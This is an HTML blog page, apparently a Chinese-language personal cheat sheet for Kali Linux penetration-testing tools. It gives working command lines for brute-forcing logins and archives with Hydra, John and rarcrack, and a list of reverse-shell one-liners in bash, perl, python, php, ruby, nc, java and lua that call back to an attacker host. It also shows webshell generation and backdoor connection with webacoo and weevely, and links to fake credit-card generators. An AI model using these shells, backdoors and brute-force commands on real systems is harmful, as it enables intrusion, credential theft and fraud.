@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Catalog1.开机配置2.各种工具使用 开机配置Kali 2020.1版本安装报错、中文乱码问题、恢复可视化界面，如何解决https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_42453837&#x2F;article&#x2F;details&#x2F;104477091?depth_1-utm_source&#x3D;distribute.pc_relevant.none-task&amp;utm_source&#x3D;distri">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kali_自我修养（持续更新）">
+<meta property="og:url" content="http://ybm911.work/2020/12/28/Kali/index.html">
+<meta property="og:site_name" content="Elli0t&#39;s Blog">
+<meta property="og:description" content="Catalog1.开机配置2.各种工具使用 开机配置Kali 2020.1版本安装报错、中文乱码问题、恢复可视化界面，如何解决https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_42453837&#x2F;article&#x2F;details&#x2F;104477091?depth_1-utm_source&#x3D;distribute.pc_relevant.none-task&amp;utm_source&#x3D;distri">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://ybm911.work/2020/12/28/Kali/robot.gif">
+<meta property="og:image" content="https://miro.medium.com/max/770/1*pRwA-jUk-zyEi8A0GbKgrw.png">
+<meta property="article:published_time" content="2020-12-28T00:00:00.000Z">
+<meta property="article:modified_time" content="2021-02-16T16:22:42.070Z">
+<meta property="article:author" content="Elli0t">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="Kali">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://ybm911.work/2020/12/28/Kali/robot.gif">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Kali_自我修养（持续更新）</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Elli0t's Blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/12/30/python-set-cookie-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/12/25/linux-%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/12/28/Kali/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/12/28/Kali/&text=Kali_自我修养（持续更新）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/12/28/Kali/&title=Kali_自我修养（持续更新）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/12/28/Kali/&is_video=false&description=Kali_自我修养（持续更新）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Kali_自我修养（持续更新）&body=Check out this article: http://ybm911.work/2020/12/28/Kali/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/12/28/Kali/&title=Kali_自我修养（持续更新）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/12/28/Kali/&title=Kali_自我修养（持续更新）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/12/28/Kali/&title=Kali_自我修养（持续更新）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/12/28/Kali/&title=Kali_自我修养（持续更新）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/12/28/Kali/&name=Kali_自我修养（持续更新）&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/12/28/Kali/&t=Kali_自我修养（持续更新）"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Catalog"><span class="toc-number">1.</span> <span class="toc-text">Catalog</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E6%9C%BA%E9%85%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">开机配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Kali-2020-1%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85%E6%8A%A5%E9%94%99%E3%80%81%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98%E3%80%81%E6%81%A2%E5%A4%8D%E5%8F%AF%E8%A7%86%E5%8C%96%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3"><span class="toc-number">2.0.1.</span> <span class="toc-text">Kali 2020.1版本安装报错、中文乱码问题、恢复可视化界面，如何解决</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">各种工具使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E7%9E%84%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95-dirb"><span class="toc-number">3.0.1.</span> <span class="toc-text">扫瞄网站目录 dirb</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-%E6%89%AB%E6%8F%8F"><span class="toc-number">3.0.2.</span> <span class="toc-text">DNS 扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%8E%8B%E7%BC%A9%E5%8C%85-rarcrack"><span class="toc-number">3.0.3.</span> <span class="toc-text">爆破压缩包 rarcrack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%AD%97%E5%85%B8%E5%B7%A5%E5%85%B7"><span class="toc-number">3.0.4.</span> <span class="toc-text">生成字典工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#john-%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7"><span class="toc-number">3.0.5.</span> <span class="toc-text">john 破解工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hydra-%E7%88%86%E7%A0%B4-Web-%E7%99%BB%E5%BD%95%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%81SSH%E3%80%81FTP%E7%AD%89%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.0.6.</span> <span class="toc-text">Hydra 爆破 Web 登录、数据库、SSH、FTP等服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kali-%E6%9C%AC%E5%9C%B0%E6%BC%8F%E6%B4%9E%E5%BA%93-usr-share-exploitdb"><span class="toc-number">3.0.7.</span> <span class="toc-text">kali 本地漏洞库:&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-nikto-%E6%96%87%E6%A1%A3%E8%AF%B4%E6%98%8Ehttps-cirt-net-nikto2-docs"><span class="toc-number">3.0.8.</span> <span class="toc-text">漏洞扫描 nikto  文档说明https:&#x2F;&#x2F;cirt.net&#x2F;nikto2-docs&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fsociety-Hacking-Tools-Pack-%E4%B8%80%E6%AC%BE%E4%B8%93%E4%B8%9A%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6"><span class="toc-number">3.0.9.</span> <span class="toc-text">Fsociety Hacking Tools Pack-一款专业的渗透测试框架</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">3.0.10.</span> <span class="toc-text">各种反弹 shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%AE-UA"><span class="toc-number">3.0.11.</span> <span class="toc-text">内置 UA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kali-%E8%8F%9C%E5%88%80%F0%9F%94%AA"><span class="toc-number">3.0.12.</span> <span class="toc-text">kali 菜刀🔪</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#webacoo"><span class="toc-number">3.0.12.0.1.</span> <span class="toc-text">webacoo</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#weebely"><span class="toc-number">3.0.12.0.2.</span> <span class="toc-text">weebely</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F-%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC"><span class="toc-number">3.0.13.</span> <span class="toc-text">扫描+漏洞版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hacker-%E7%9A%84%E7%BD%91%E7%AB%99"><span class="toc-number">3.0.14.</span> <span class="toc-text">Hacker 的网站</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Kali_自我修养（持续更新）
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Eli0t</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-12-28T00:00:00.000Z" itemprop="datePublished">2020-12-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Kali/" rel="tag">Kali</a>, <a class="tag-link-link" href="/tags/Linux/" rel="tag">Linux</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Catalog"><a href="#Catalog" class="headerlink" title="Catalog"></a>Catalog</h2><p>1.<a href="#%E5%BC%80%E6%9C%BA%E9%85%8D%E7%BD%AE">开机配置</a><br>2.<a href="#%E5%90%84%E7%A7%8D%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8">各种工具使用</a></p>
+<h2 id="开机配置"><a href="#开机配置" class="headerlink" title="开机配置"></a>开机配置</h2><h4 id="Kali-2020-1版本安装报错、中文乱码问题、恢复可视化界面，如何解决"><a href="#Kali-2020-1版本安装报错、中文乱码问题、恢复可视化界面，如何解决" class="headerlink" title="Kali 2020.1版本安装报错、中文乱码问题、恢复可视化界面，如何解决"></a>Kali 2020.1版本安装报错、中文乱码问题、恢复可视化界面，如何解决</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42453837/article/details/104477091?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task">https://blog.csdn.net/weixin_42453837/article/details/104477091?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p>
+<h2 id="各种工具使用"><a href="#各种工具使用" class="headerlink" title="各种工具使用"></a>各种工具使用</h2><h4 id="扫瞄网站目录-dirb"><a href="#扫瞄网站目录-dirb" class="headerlink" title="扫瞄网站目录 dirb"></a>扫瞄网站目录 dirb</h4><p><code>dirb https://baidu.com</code></p>
+<h4 id="DNS-扫描"><a href="#DNS-扫描" class="headerlink" title="DNS 扫描"></a>DNS 扫描</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dnsenum</span><br><span class="line">dnsrecon</span><br><span class="line">dnsmap</span><br></pre></td></tr></table></figure>
+<h4 id="爆破压缩包-rarcrack"><a href="#爆破压缩包-rarcrack" class="headerlink" title="爆破压缩包 rarcrack"></a>爆破压缩包 rarcrack</h4><p><code>rarcrack 文件名 —threads 线程数 —type rar|zip|7z</code></p>
+<h4 id="生成字典工具"><a href="#生成字典工具" class="headerlink" title="生成字典工具"></a><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/170817.html">生成字典工具</a></h4><p>生成字典<code>crunch 27 27 -t flag&#123;12345678909876543%%%%&#125; &gt; 1.txt</code></p>
+<h4 id="john-破解工具"><a href="#john-破解工具" class="headerlink" title="john 破解工具"></a><a target="_blank" rel="noopener" href="https://www.fujieace.com/kali-linux/courses/john.html">john 破解工具</a></h4><blockquote>
+<p>全称叫“John the Ripper password cracker（约翰开膛手密码破解）”。<br>John the Ripper是一个快速的密码破解程序，目前可用于Unix，Windows，DOS和OpenVMS的许多口味。其主要目的是检测弱Unix密码。除了在各种Unix系统上最常见的几种crypt（3）密码哈希类型之外，现在支持的还有Windows LM哈希，以及社区增强版本中的大量其他哈希和密码。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/boy_from_village/article/details/80383419">john 破解系统密码（windows和kali）</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/despotic/p/11344141.html">使用John破解zip压缩包的密码</a><br>爆破工具<code>John XXXXX —wordlist-1.txt —users-flag</code></p>
+</blockquote>
+<h4 id="Hydra-爆破-Web-登录、数据库、SSH、FTP等服务"><a href="#Hydra-爆破-Web-登录、数据库、SSH、FTP等服务" class="headerlink" title="Hydra 爆破 Web 登录、数据库、SSH、FTP等服务"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/csacs/article/details/88141215?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">Hydra 爆破 Web 登录、数据库、SSH、FTP等服务</a></h4><p><code>hydra -L username.txt -P password.txt -v mysql://目标IP:mysql端口号</code></p>
+<h4 id="kali-本地漏洞库-usr-share-exploitdb"><a href="#kali-本地漏洞库-usr-share-exploitdb" class="headerlink" title="kali 本地漏洞库:/usr/share/exploitdb/"></a>kali 本地漏洞库:/usr/share/exploitdb/</h4><p>/usr/share/exploitdb/<br>查找漏洞：<br><code>searchsploit ms17-010</code></p>
+<h4 id="漏洞扫描-nikto-文档说明https-cirt-net-nikto2-docs"><a href="#漏洞扫描-nikto-文档说明https-cirt-net-nikto2-docs" class="headerlink" title="漏洞扫描 nikto  文档说明https://cirt.net/nikto2-docs/"></a>漏洞扫描 nikto  文档说明<a target="_blank" rel="noopener" href="https://cirt.net/nikto2-docs/">https://cirt.net/nikto2-docs/</a></h4><p><code>nikto -h http:192.168.1.1</code></p>
+<h4 id="Fsociety-Hacking-Tools-Pack-一款专业的渗透测试框架"><a href="#Fsociety-Hacking-Tools-Pack-一款专业的渗透测试框架" class="headerlink" title="Fsociety Hacking Tools Pack-一款专业的渗透测试框架"></a>Fsociety Hacking Tools Pack-一款专业的渗透测试框架</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/159210.html">https://www.freebuf.com/column/159210.html</a><br><img src="robot.gif"><br>介绍视频：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=t3uYpMrK2EU">fsociety Hacking Tools Pack - Mr. Robot Penetration Testing Framework</a></p>
+<h4 id="各种反弹-shell"><a href="#各种反弹-shell" class="headerlink" title="各种反弹 shell"></a>各种反弹 shell</h4><ol>
+<li>利用 exec 弹<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ exec 5&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;your-fuxking-public-ip&#x2F;your-fuxking-port 0&gt;&amp;1</span><br><span class="line">$ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure></li>
+<li>利用 bash 弹<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在目标机器上执行</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your-fuxking-public-ip&#x2F;your-fuxking-port 0&gt;&amp;1</span><br></pre></td></tr></table></figure></li>
+<li>利用 perl 弹<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;your-fuxking-public-ip&quot;;$p&#x3D;your-fuxking-port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure></li>
+<li>利用 python 弹<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your-fuxking-public-ip&quot;,your-fuxking-port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure></li>
+<li>利用 php 弹<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure></li>
+<li>利用 ruby 弹<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure></li>
+<li>利用 nc 弹<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span><br><span class="line">nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</span><br></pre></td></tr></table></figure></li>
+<li>利用 java 弹<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure></li>
+<li>利用 lua 弹(Lua 是一种轻量小巧的脚本语言，用标准C语言编写并以源代码形式开放)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;1234&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+<p>kali 自带反弹 shell<br><code>find / -name php-reverse-shell.php</code><br>修改好ip和port就可以用了。</p>
+<h4 id="内置-UA"><a href="#内置-UA" class="headerlink" title="内置 UA"></a>内置 UA</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">安卓QQ内置浏览器UA:</span><br><span class="line"></span><br><span class="line">Mozilla&#x2F;5.0 (Linux; Android 5.0; SM-N9100 Build&#x2F;LRX21V) &gt; AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Version&#x2F;4.0 &gt; Chrome&#x2F;37.0.0.0 Mobile Safari&#x2F;537.36 V1_AND_SQ_5.3.1_196_YYB_D &gt; QQ&#x2F;5.3.1.2335 NetType&#x2F;WIFI</span><br><span class="line"></span><br><span class="line">安卓微信内置浏览器UA:</span><br><span class="line"></span><br><span class="line">Mozilla&#x2F;5.0 (Linux; Android 5.0; SM-N9100 Build&#x2F;LRX21V) &gt; AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Version&#x2F;4.0 &gt; Chrome&#x2F;37.0.0.0 Mobile Safari&#x2F;537.36 &gt; MicroMessenger&#x2F;6.0.2.56_r958800.520 NetType&#x2F;WIFI</span><br><span class="line"></span><br><span class="line">IOSQQ内置浏览器UA:</span><br><span class="line"></span><br><span class="line">Mozilla&#x2F;5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) &gt; AppleWebKit&#x2F;537.51.2 (KHTML, like Gecko) Mobile&#x2F;11D257 &gt; QQ&#x2F;5.2.1.302 NetType&#x2F;WIFI Mem&#x2F;28</span><br><span class="line"></span><br><span class="line">IOS微信内置浏览器UA:</span><br><span class="line"></span><br><span class="line">Mozilla&#x2F;5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) &gt; AppleWebKit&#x2F;537.51.2 (KHTML, like Gecko) Mobile&#x2F;11D257 &gt; MicroMessenger&#x2F;6.0.1 NetType&#x2F;WIFI</span><br></pre></td></tr></table></figure>
+<h4 id="kali-菜刀🔪"><a href="#kali-菜刀🔪" class="headerlink" title="kali 菜刀🔪"></a>kali 菜刀🔪</h4><h6 id="webacoo"><a href="#webacoo" class="headerlink" title="webacoo"></a>webacoo</h6><p><a target="_blank" rel="noopener" href="http://www.secist.com/archives/1280.html?_t=1563114175">http://www.secist.com/archives/1280.html?_t=1563114175</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">webacoo -g -o secist.php</span><br><span class="line">webacoo -t -u http:&#x2F;&#x2F;192.168.30.128&#x2F;secist.php</span><br><span class="line"></span><br><span class="line">-g: 生成 webshell 必须结合 -o 哦参数一起使用。</span><br><span class="line">-f: php系统命令执行函数，默认为 system 。</span><br><span class="line">-o: 导出 webshell 文件。</span><br><span class="line">-r: 生成不经编码的 webshell 。</span><br><span class="line">-t: 远程使用 terminal 连接，必须和 -u 一起使用。</span><br><span class="line">-u：后门地址。</span><br><span class="line">-e：单独的命令执行模式，必须和 -t -u 一起使用。</span><br><span class="line">-m：http 请求方法，默认以 GET 传送。</span><br><span class="line">-c: cookie名称。</span><br><span class="line">-d: 界定符。</span><br><span class="line">-a: USER-AGENT 。</span><br><span class="line">-p: 使用代理。</span><br><span class="line">-v：显示详细信息。</span><br><span class="line">-l：日志记录文件。</span><br><span class="line">－ｈ：显示帮助信息。</span><br><span class="line">update：更新ｗｅｂａｃｏｏ</span><br></pre></td></tr></table></figure>
+<h6 id="weebely"><a href="#weebely" class="headerlink" title="weebely"></a>weebely</h6><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/106587791">https://blog.csdn.net/qq_45521281/article/details/106587791</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely generate &lt;连接密码&gt; &lt;path&gt;	生成后门</span><br><span class="line">weevely &lt;url&gt; &lt;连接密码&gt;	连接后门</span><br></pre></td></tr></table></figure>
+<h4 id="扫描-漏洞版本"><a href="#扫描-漏洞版本" class="headerlink" title="扫描+漏洞版本"></a>扫描+漏洞版本</h4><p>灵感来源：<a target="_blank" rel="noopener" href="https://medium.com/hacker-toolbelt/dvwa-1-9-ii-brute-force-4cd8efe1c7f2">https://medium.com/hacker-toolbelt/dvwa-1-9-ii-brute-force-4cd8efe1c7f2</a></p>
+<p>先用 nmap 发现版本再 <code>searchploit apache | grep 2.4</code> （假设是 Apache 2.4.29）</p>
+<p><img src="https://miro.medium.com/max/770/1*pRwA-jUk-zyEi8A0GbKgrw.png" alt="searchploit"></p>
+<p>发现了可能的漏洞利用，根本特权升级（CVE-2019-0211）！</p>
+<h4 id="Hacker-的网站"><a href="#Hacker-的网站" class="headerlink" title="Hacker 的网站"></a>Hacker 的网站</h4><p>fake info</p>
+<p><a target="_blank" rel="noopener" href="https://www.bestccgen.com/">https://www.bestccgen.com/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.fakepersongenerator.com/">https://www.fakepersongenerator.com</a></p>
+<p><a target="_blank" rel="noopener" href="http://card-generator.com/">http://card-generator.com/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
